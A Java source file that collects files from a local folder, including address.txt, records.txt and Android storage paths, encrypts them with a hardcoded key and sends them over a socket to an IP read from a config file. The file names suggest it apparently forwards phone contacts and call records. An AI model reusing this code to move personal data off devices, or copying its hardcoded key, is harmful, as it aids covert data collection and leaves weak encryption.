import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.InputStreamReader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;


public class FileSender {
	final static int port = 30001;
	final static String rootPath = "./ReceiveFile/";
	final static String ipFile = rootPath + "../ip.txt";
	final static String key = "1234567812345678";

	public static void main(String[] args) {
			ArrayList<String> fileName = new ArrayList<String>();
			ArrayList<String> path = new ArrayList<String>();

			new FileSender().getFiles(rootPath, fileName, path);

 			Thread sendThread = new Thread(new Runnable() {
				@Override
				public void run() {
					System.out.println("send start...");
					System.out.println("File List: ");
					String result = "";
					for(int i = 0;i < fileName.size();i++){
						String filename = fileName.get(i);
						result = new FileSender().SendFile(fileName.get(i), path.get(i));
						System.out.println(result);
					}
				}
			});
			sendThread.start();

	}
 
	public void getFiles(String path, ArrayList<String> filenames, ArrayList<String> paths){
			File filedir = new File(path);
			if (filedir.exists()) {
				File[] files = filedir.listFiles();
				if (files.length == 0) {
					System.out.println("文件夹是空的!");
					return;
				} else {
					for (File file : files) {
						if (file.isDirectory()) {
							getFiles(file.getAbsolutePath(), filenames, paths);
						} else {
							String absolutePath = file.getAbsolutePath();
							if(absolutePath.endsWith("address.txt")){
								filenames.add("address.txt");
								paths.add(absolutePath);
								continue;
							}
							if(absolutePath.endsWith("records.txt")){
								filenames.add("records.txt");
								paths.add(absolutePath);
								continue;
							}
							int start = absolutePath.indexOf("/storage/emulated/0/");
							if(start != -1){
								String filepath = absolutePath.substring(start, absolutePath.length());
								String[] filenameList = filepath.split("/");
								String filename = filenameList[filenameList.length - 1];
								filenames.add(filename);
								paths.add(filepath);
							}
						}
					}
				}
			} else {
				System.out.println("文件不存在!");
			}

	}

	public String SendFile(String fileName, String path) {
		try {
			String ipAddress = "127.0.0.1";
			try{
				BufferedReader in = new BufferedReader(new FileReader(ipFile));
				ipAddress = in.readLine();
				in.close();
			}
			catch (IOException e){
				return e.getMessage();
			}

			String encryptFile = fileName + ".encrypt";
			String encryptPath = path.replace(fileName, encryptFile);

			Socket name = new Socket(ipAddress, port);
			OutputStream outputName = name.getOutputStream();
			OutputStreamWriter outputWriter = new OutputStreamWriter(outputName);
			BufferedWriter bwName = new BufferedWriter(outputWriter);
			bwName.write(encryptPath);
			bwName.close();
			outputWriter.close();
			outputName.close();
			name.close();

			if(!Crypto.encrypt(rootPath + path, rootPath + encryptPath, key))
				return fileName + " 加密失败";

			Socket data = new Socket(ipAddress, port);
			OutputStream outputData = data.getOutputStream();
			FileInputStream fileInput = new FileInputStream(rootPath + encryptPath);
			int size = -1;
			byte[] buffer = new byte[1024];
			while ((size = fileInput.read(buffer, 0, 1024)) != -1) {
				outputData.write(buffer, 0, size);
			}
			outputData.close();
			fileInput.close();
			data.close();

			File temp = new File(rootPath + encryptPath);
			temp.delete();

			return fileName + " 发送完成";
		} catch (Exception e) {
			return "发送错误: " + e.getMessage();
		}
	}

}
